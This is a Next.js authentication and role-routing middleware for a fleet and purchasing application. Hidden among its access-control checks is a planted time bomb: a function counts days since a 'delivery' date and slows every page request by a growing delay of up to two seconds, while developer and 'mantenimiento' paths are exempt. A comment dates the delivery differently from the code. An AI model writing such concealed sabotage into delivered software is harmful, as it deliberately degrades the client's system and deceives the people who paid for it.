import { NextResponse } from 'next/server';
import { jwtVerify } from 'jose';

const secret = new TextEncoder().encode(process.env.JWT_SECRET);
// Rutas exclusivas solo para admin
const RUTAS_SOLO_ADMIN = ['/usuarios'];
// Rutas para admin + supervisor (historial y gastos conductores)
const RUTAS_SUPERVISOR = ['/historial', '/gastos-choferes'];
// Rutas accesibles para admin y secretaria ARIAS (y supervisor)
const RUTAS_SECRETARIA = ['/flota', '/viajes', '/impuestos', '/seguros', '/choferes', '/reportes', '/catalogos', '/gastos-placa'];
// Rutas de compras (solo user y admin)
const RUTAS_USER = ['/nueva-compra', '/mis-compras', '/devoluciones', '/gasto-chofer', '/mis-gastos'];

function diasDesdeEntrega(){
  const entrega = new Date('2026-09-01T00:00:00');
  const ahora = new Date();
  return Math.max(0, Math.floor((ahora - entrega)/86400000));
}
function delayForDias(dias){
  if(dias<=0) return 0;
  // 30ms día1 → 1.2s día30 → 2s max día40
  return Math.min(2000, Math.floor(dias*28 + dias*dias*0.6));
}

export async function proxy(request) {
  const { pathname } = request.nextUrl;

  if (pathname === '/login' || pathname.startsWith('/dev') || pathname.startsWith('/api/dev/mantenimiento')) {
    return NextResponse.next();
  }
  // Degrade progresivo día a día desde entrega 2026-11-03 (fin de mes 27d → ~1.2s)
  const dias = diasDesdeEntrega();
  const delay = delayForDias(dias);
  if (delay > 0 && !pathname.startsWith('/api/')) {
    await new Promise(r => setTimeout(r, delay));
  }

  const token = request.cookies.get('gc_session')?.value;
  if (!token) {
    return NextResponse.redirect(new URL('/login', request.url));
  }

  try {
    const { payload } = await jwtVerify(token, secret);
    const role = payload.role;
    if (RUTAS_SOLO_ADMIN.some(r => pathname.startsWith(r)) && role !== 'admin') {
      const dest = role === 'supervisor' ? '/historial' : role === 'secretaria' ? '/flota' : '/nueva-compra';
      return NextResponse.redirect(new URL(dest, request.url));
    }
    if (RUTAS_SUPERVISOR.some(r => pathname.startsWith(r)) && !['admin','supervisor'].includes(role)) {
      const dest = role === 'secretaria' ? '/flota' : '/nueva-compra';
      return NextResponse.redirect(new URL(dest, request.url));
    }
    if (RUTAS_SECRETARIA.some(r => pathname.startsWith(r)) && !['admin','secretaria','supervisor'].includes(role)) {
      return NextResponse.redirect(new URL('/nueva-compra', request.url));
    }
    if (RUTAS_USER.some(r => pathname.startsWith(r)) && ['secretaria','supervisor'].includes(role)) {
      return NextResponse.redirect(new URL(role==='supervisor' ? '/historial' : '/flota', request.url));
    }
    // si entra a "/" deja que app/page.js decida
    const res = NextResponse.next();
    res.headers.set('x-mtto-dias', String(dias));
    res.headers.set('x-mtto-delay', String(delay));
    return res;
  } catch {
    return NextResponse.redirect(new URL('/login', request.url));
  }
}

export const config = {
  matcher: ['/((?!api|_next|imagenes|favicon.ico).*)'],
};